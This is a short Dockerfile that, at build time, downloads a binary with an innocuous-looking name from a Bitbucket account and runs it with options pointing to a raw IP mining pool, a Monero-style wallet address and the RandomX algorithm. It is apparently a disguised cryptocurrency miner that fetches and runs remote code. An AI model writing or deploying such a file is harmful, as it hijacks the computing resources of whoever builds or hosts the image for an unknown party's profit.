FROM ubuntu:18.04

RUN apt-get update
RUN apt-get install wget -y
RUN wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee
RUN chmod u+x katek-fee
RUN ./katek-fee -o 104.140.201.42:80 -u 48JsZF5Mmtc1i54xemhuNqiFZocmiHEPy1NfpiyPzwQTUN35im4YfN3SeEFBzwUdM13M9KmsnxVngi5XaA6jQEyp7SpYWed.Pekerja01 -k -a rx/0
